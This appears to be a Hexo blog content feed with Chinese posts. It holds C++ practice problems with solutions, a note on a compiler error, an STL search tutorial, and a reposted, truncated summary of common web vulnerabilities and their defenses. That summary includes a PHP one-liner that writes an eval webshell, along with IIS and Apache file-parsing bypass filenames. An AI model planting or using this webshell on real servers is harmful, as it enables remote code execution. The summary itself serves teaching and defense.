href="#7-hexo三连" class="headerlink" title="7. hexo三连"></a>7. hexo三连</h3>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寝室谁最高</title>
      <link href="/post/257e828a.html"/>
      <url>/post/257e828a.html</url>
      
        <content type="html"><![CDATA[<p>【问题描述】</p><p>学校选拔篮球队员，每间宿舍最多有 4 个人。现给出宿舍列表，请找出每个宿舍最高的同学。定义一个学生类 Student，有身高 height，体重 weight 等。</p><p>【输入格式】</p><p>首先输入一个整型数 <em>n</em> （1≤<em>n</em>≤106），表示有 <em>n</em> 位同学。</p><p>紧跟着 <em>n</em> 行输入，每一行格式为：宿舍号 name height weight。<br>宿舍号的区间为 [0, 999999]， name 由字母组成，长度小于 16，height，weight 为正整数。</p><p>【输出格式】</p><p>按宿舍号从小到大排序，输出每间宿舍身高最高的同学信息。题目保证每间宿舍只有一位身高最高的同学。</p><p>注意宿舍号不足 6 位的，要按 6 位补齐前导 0。</p><p>【输入样例】</p><p>7</p><p>000000 Tom 175 120</p><p>000001 Jack 180 130</p><p>000001 Hale 160 140</p><p>000000 Marry 160 120</p><p>000000 Jerry 165 110</p><p>000003 ETAF 183 145</p><p>000001 Mickey 170 115</p><p>【输出样例】</p><p>000000 Tom 175 120</p><p>000001 Jack 180 130</p><p>000003 ETAF 183 145</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">string room;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> height;</span><br><span class="line"><span class="type">int</span> weight;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; <span class="built_in">setw</span>(<span class="number">6</span>) &lt;&lt; room &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; height &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; weight &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(Student stu1, Student stu2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (stu1.room != stu2.room)</span><br><span class="line"><span class="keyword">return</span> stu1.room &lt; stu2.room;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> stu1.height &gt; stu2.height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(vector&lt;Student&gt; stu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string temp = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : stu)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i.room != temp)</span><br><span class="line">&#123;</span><br><span class="line">temp = i.room;</span><br><span class="line">i.<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">Student temp;</span><br><span class="line">vector&lt;Student&gt; student;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; temp.room &gt;&gt; temp.name &gt;&gt; temp.height &gt;&gt; temp.weight;</span><br><span class="line">student.<span class="built_in">push_back</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先按照宿舍号排序，宿舍号相同按照身高排序</span></span><br><span class="line"><span class="built_in">sort</span>(student.<span class="built_in">begin</span>(), student.<span class="built_in">end</span>(), cmp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挑选出寝室中最高的同学进行打印</span></span><br><span class="line"><span class="built_in">print</span>(student);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相邻数对</title>
      <link href="/post/75b498b8.html"/>
      <url>/post/75b498b8.html</url>
      
        <content type="html"><![CDATA[<h3 id="【问题描述】"><a href="#【问题描述】" class="headerlink" title="【问题描述】"></a>【问题描述】</h3><p> 给定n个不同的整数，问这些数中有多少对整数，它们的值正好相差1。 </p><h3 id="【输入形式】"><a href="#【输入形式】" class="headerlink" title="【输入形式】"></a>【输入形式】</h3><p>  输入的第一行包含一个整数n，表示给定整数的个数。<br>  第二行包含所给定的n个整数。</p><h3 id="【输出形式】"><a href="#【输出形式】" class="headerlink" title="【输出形式】"></a>【输出形式】</h3><p>  输出一个整数，表示值正好相差1的数对的个数。</p><h3 id="【样例输入】"><a href="#【样例输入】" class="headerlink" title="【样例输入】"></a>【样例输入】</h3><p>　6<br>　10 2 6 3 7 8 </p><h3 id="【样例输出】"><a href="#【样例输出】" class="headerlink" title="【样例输出】"></a>【样例输出】</h3><p>　    3 </p><h3 id="【样例说明】"><a href="#【样例说明】" class="headerlink" title="【样例说明】"></a>【样例说明】</h3><p>　值正好相差1的数对包括(2, 3), (6, 7), (7, 8)。</p><h3 id="【评分标准】"><a href="#【评分标准】" class="headerlink" title="【评分标准】"></a>【评分标准】</h3><p>　　<strong>评测用例规模与约定</strong><br>　　1&lt;=n&lt;=1000，给定的整数为不超过10000的非负整数</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Pair&amp; rhs)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> (a == rhs.a) &amp;&amp; (b == rhs.b);</span><br><span class="line">&#125;<span class="comment">// 必须有，虽然不知道我哪里用到了两个Pair类对象进行相等比较，但是缺少对==的重载就会报错</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; num;</span><br><span class="line"><span class="type">int</span> n, temp;</span><br><span class="line"><span class="type">int</span> small, big;<span class="comment">// 存放比当前数字小1和大1的数字</span></span><br><span class="line">vector&lt;Pair&gt; res;<span class="comment">// 存放相邻整数对</span></span><br><span class="line">Pair temp_;    <span class="comment">// 临时变量</span></span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; temp;</span><br><span class="line">num.<span class="built_in">push_back</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : num)</span><br><span class="line">&#123;</span><br><span class="line">small = i - <span class="number">1</span>;</span><br><span class="line">big = i + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">count</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), small))<span class="comment">// 存在比i小1的数字</span></span><br><span class="line">&#123;</span><br><span class="line">temp_.a = small;</span><br><span class="line">temp_.b = i;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">count</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>(), temp_))<span class="comment">// 并且res中不存在该相邻整数对</span></span><br><span class="line">res.<span class="built_in">push_back</span>(temp_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">count</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), big))<span class="comment">// 存在比i大1的数字</span></span><br><span class="line">&#123;</span><br><span class="line">temp_.a = i;</span><br><span class="line">temp_.b = big;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">count</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>(), temp_))<span class="comment">// 并且res中不存在该相邻整数对</span></span><br><span class="line">res.<span class="built_in">push_back</span>(temp_);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; res.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>==:不定义该运算符可接收的类型的转换</title>
      <link href="/post/f18a017c.html"/>
      <url>/post/f18a017c.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ERROR：C2676 二进制“==”:“Pair”不定义该运算符或到预定义运算符可接收的类型的转换</p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>这个报错大意就是说，编译器不知道Pair类的对象之间该如何判断是否相等</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在类里面增加对&quot;==&quot;的重载函数即可</span></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Pair &amp;rhs)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> (a == rhs.a) &amp;&amp; (b == rhs.b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 常见报错 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++常见报错 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vector判断与查找特定元素</title>
      <link href="/post/d8a4edf7.html"/>
      <url>/post/d8a4edf7.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://blog.csdn.net/guotianqing/article/details/105832070">c++判断vector中是否存在特定元素的方法</a></p><p>vector并未提供确定某一元素是否存在或查找特定元素，但是STL算法提供了以下函数方便我们计算</p><h2 id="函数与示例"><a href="#函数与示例" class="headerlink" title="函数与示例"></a>函数与示例</h2><p><strong>注：示例均包含下列头文件并使用std命名空间</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br></pre></td></tr></table></figure><h3 id="1-any-of"><a href="#1-any-of" class="headerlink" title="1. any_of"></a>1. any_of</h3><p><strong>应用</strong>：判断容器中是否存在满足期望的特定元素</p><p><strong>参数</strong>：any_of包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为条件表达式</p><p><strong>返回值</strong>：bool，1-&gt;存在满足期望的元素；0-&gt;不存在满足期望的元素</p><p><strong>注意</strong>：any_of的第三个参数无法传入单个具体值，只能编写期望的条件表达式</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; num = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">any_of</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), [] (<span class="type">int</span> i) &#123;<span class="keyword">return</span> i &gt; <span class="number">1</span>;&#125;))<span class="comment">// 判断容器中是否存在大于1的元素</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;number exists&quot;</span> &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h3 id="2-binary-search"><a href="#2-binary-search" class="headerlink" title="2. binary_search"></a>2. binary_search</h3><p><strong>应用</strong>：对于<strong>从小到大</strong>排列的容器判断指定元素是否存在</p><p><strong>参数</strong>：binary_search包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为指定元素</p><p><strong>返回值</strong>：bool，1-&gt;指定元素存在；0-&gt;指定元素不存在</p><p><strong>注意</strong>：使用该函数前必须保证容器中的元素<strong>从小到大</strong>进行排列</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; num = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>());<span class="comment">// 从小到大排列num</span></span><br><span class="line">i = <span class="built_in">binary_search</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="number">4</span>);<span class="comment">// 判断容器中是否存在4</span></span><br><span class="line">cout &lt;&lt; i;<span class="comment">// 1-&gt;4存在；0-&gt;4不存在</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());<span class="comment">// 从大到小排列num</span></span><br><span class="line">i = <span class="built_in">binary_search</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="number">4</span>);<span class="comment">// 判断容器中是否存在4</span></span><br><span class="line">cout &lt;&lt; i;<span class="comment">// 1-&gt;4存在；0-&gt;4不存在</span></span><br></pre></td></tr></table></figure><p>注：对于sort函数不熟悉可以查看<a href="https://www.dqywy.top/post/3216d44c.html">c++ sort函数</a></p><h3 id="3-std-count"><a href="#3-std-count" class="headerlink" title="3. std::count"></a>3. std::count</h3><p><strong>应用</strong>：计算指定元素的个数</p><p><strong>参数</strong>：std::count包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为指定元素</p><p><strong>返回值</strong>：指定元素的个数，不存在则返回0</p><p><strong>注意</strong>：要么使用std命名空间，要么使用<code>std::count</code></p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; num = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>&#125;;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;4的个数为: &quot;</span> &lt;&lt; <span class="built_in">count</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="number">4</span>) &lt;&lt; endl;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">count</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="number">8</span>))</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;number not exists! &quot;</span> &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h3 id="4-std-find"><a href="#4-std-find" class="headerlink" title="4. std::find"></a>4. std::find</h3><p><strong>应用</strong>：判断指定元素是否存在</p><p><strong>参数</strong>：std::find包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为指定元素</p><p><strong>返回值</strong>：指定元素的迭代器，如果不存在返回容器最后一个元素的<strong>下一个位置</strong>的迭代器(即num.end())</p><p><strong>注意</strong>：如果查找的元素不存在返回的是容器名.end()，如果查找元素不存在的话不可以打印*迭代器，否则会导致程序崩溃</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; num = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator i, j;</span><br><span class="line">i = <span class="built_in">find</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (i == num.<span class="built_in">end</span>())</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;number not exists! &quot;</span> &lt;&lt; endl;</span><br><span class="line">j = <span class="built_in">find</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), <span class="number">4</span>);</span><br></pre></td></tr></table></figure><h3 id="5-std-find-if"><a href="#5-std-find-if" class="headerlink" title="5. std::find_if"></a>5. std::find_if</h3><p><strong>应用</strong>：获取满足条件的元素集合的第一个元素的迭代器</p><p><strong>参数</strong>：std::find包含三个参数，第一第二分别是容器的起始位置和结束位置，第三个参数为条件表达式</p><p><strong>返回值</strong>：满足条件的元素集合的第一个元素的迭代器，如果不存在满足条件的元素则返回容器最后一个元素的<strong>下一个位置</strong>的迭代器(即num.end())</p><p><strong>注意</strong>：如果查找的元素不存在返回的是容器名.end()，如果查找元素不存在的话不可以打印*迭代器，否则会导致程序崩溃</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; num = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span> &#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator i;</span><br><span class="line">i = <span class="built_in">find_if</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>(), [](<span class="type">int</span> j) &#123;<span class="keyword">return</span> j &gt; <span class="number">3</span> <span class="keyword">and</span> j &lt; <span class="number">5</span>;&#125;);</span><br><span class="line">cout &lt;&lt; *i;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>对于从小到大排好序的vector，使用binary_search</li><li>仅判断是否存在某元素，使用find</li><li>需要某元素总个数时，使用count</li><li>支持复杂条件的查找时，使用any_of判断元素是否存在，使用find_if获取满足条件的元素集合的第一个元素的迭代器</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> c++实用函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见Web漏洞总结</title>
      <link href="/post/64098964.html"/>
      <url>/post/64098964.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://blog.csdn.net/strive_____/article/details/100716849">常见的Web应用的漏洞总结（原理、危害、防御）</a></p><p>一、 <a href="https://so.csdn.net/so/search?q=SQL注入&amp;spm=1001.2101.3001.7020">SQL注入</a>(SQL Inject)[OWASP TOP1 2017]：<br>1.原理：<br>SQL注入就是把SQL命令插入到Web表单然后提交到所在页面请求（查询字符串），从而达到欺骗服务器执行恶意的SQL命令。<br>它是利用现在已有的应用程序，将<a href="https://so.csdn.net/so/search?q=SQL语句&amp;spm=1001.2101.3001.7020">SQL语句</a>插入到数据库中执行，执行一些并非按照设计者意图的SQL语句。<br>2.原因：<br>根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。<br>3.危害：<br>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>破坏硬盘数据，瘫痪全系统。<br>4.防御：<br>(1)严格的数据类型<br>(2)字符转义<br>(3)使用预编译语句<br>(4)存储过程</p><p>二、 XSS(Cross-site Script)[OWASP TOP7 2017]<br>原理：<br>攻击者往Web页面里插入恶意html标签或者javascript代码。<br>分别是反射型XSS、持久型XSS和DOM XSS<br>危害：<br>（1）网络钓鱼，盗取各类用户的账号<br>（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作<br>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等<br>（4）强制弹出广告页面，刷流量等<br>（5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂等<br>（6）进行基于大量的客户端攻击，如DDOS攻击<br>（7）结合其它漏洞，如CSRF漏洞。<br>3.防御：<br>（1）代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。<br>（2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。<br>（3）通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。<br>（4）尽量采用POST 而非GET 提交表单<br>三、 上传漏洞<br>原理<br>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器，服务器未经任何检验或过滤，从而造成文件的执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。<br>危害<br>1)上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。<br>2)上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);<br>3)上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。<br>4)上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br>防御：<br>（1）文件扩展名服务端白名单校验。<br>（2）文件内容服务端校验。<br>（3）上传文件重命名。<br>（4）隐藏上传文件路径。<br>（5）文件上传的目录设置为不可执行<br>（6）单独设置文件服务器的域名<br>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。<br>四、 文件解析漏洞<br>1.IIS 6.0解析利用方法有两种<br>（1）目录解析：/xx.asp/xx.jpg<br>（2）文件解析：wooyun.asp;.jpg<br>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp<br>还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx<br>2.Apache解析漏洞后缀名解析漏洞<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。<br>3.PHP CGI解析漏洞<br>在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>1<br>的文件，然后访问wooyun.jpg/x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。<br>4.%00截断漏洞<br>当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p><p>五、 CSRF（Cross-Site Request 